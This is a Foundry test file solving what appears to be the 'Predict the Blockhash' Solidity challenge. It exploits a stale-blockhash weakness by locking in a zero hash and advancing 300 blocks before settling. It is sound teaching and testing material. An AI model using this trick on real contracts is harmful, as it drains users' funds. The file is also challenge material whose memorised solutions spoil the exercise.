// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../src/PredictTheBlockhash.sol";

contract PredictTheBlockhashTest is Test {
    PredictTheBlockhash public predictTheBlockhash;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheBlockhash = (new PredictTheBlockhash){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheBlockhash);
    }

    function testExploit() public {
        // Set block number
        // To roll forward, add the number of blocks to -256,
        // Eg. roll forward 10 blocks: -256 + 10 = -246
        // vm.roll(blockNumber - 256);

        // Put your solution here
        bytes32 guessBlockHash = bytes32(0x0000000000000000000000000000000000000000000000000000000000000000);
        predictTheBlockhash.lockInGuess{value: 1 ether}(guessBlockHash);
        vm.roll(block.number + 300);
        predictTheBlockhash.settle();

        // assert
        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheBlockhash.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}